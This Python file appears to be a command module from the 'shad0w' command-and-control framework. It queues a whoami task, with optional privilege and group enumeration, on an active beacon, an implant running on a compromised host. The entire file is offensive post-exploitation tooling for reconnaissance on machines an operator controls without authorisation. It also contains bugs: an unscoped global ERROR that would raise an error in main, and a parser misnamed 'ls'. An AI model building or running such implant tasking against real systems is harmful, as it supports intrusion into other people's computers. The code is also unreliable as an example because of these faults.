# 
# Get infomation about the current user
#

import json
import argparse

EXEC_ID       = 0x4000
OPCODE_WHOAMI = 0x7000

ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def whoami_callback(shad0w, data):
    print(data)

    return ""

def get_whoami_args(args):
    data = ""

    if args.all:
        return "all"
    
    if args.groups:
        data += "groups"
    
    if args.privs:
        data += "privs"
    
    return data

def main(shad0w, args):

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # usage examples
    usage_examples = """

Examples:

whoami
whoami --all
whoami --privs
whoami --privs --groups
"""
    
    parse = argparse.ArgumentParser(prog='ls',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-a", "--all", action='store_true', help="Show all avalible infomation")
    parse.add_argument("-p", "--privs", action='store_true', help="Show all privilages")
    parse.add_argument("-g", "--groups", action='store_true', help="Show all groups the user is a member of")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # the user might have just run 'ls' but if not lets fail
    if (not len(raw_args) == 1) and (not raw_args == "whoami"):
        if ERROR:
            ERROR = False
            print(error_list)
            parse.print_help()
            return
    
    # this will change to args to args for whoami
    data = get_whoami_args(args)

    # make the json
    data = {"op" : OPCODE_WHOAMI, "args": data}
    data = json.dumps(data)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)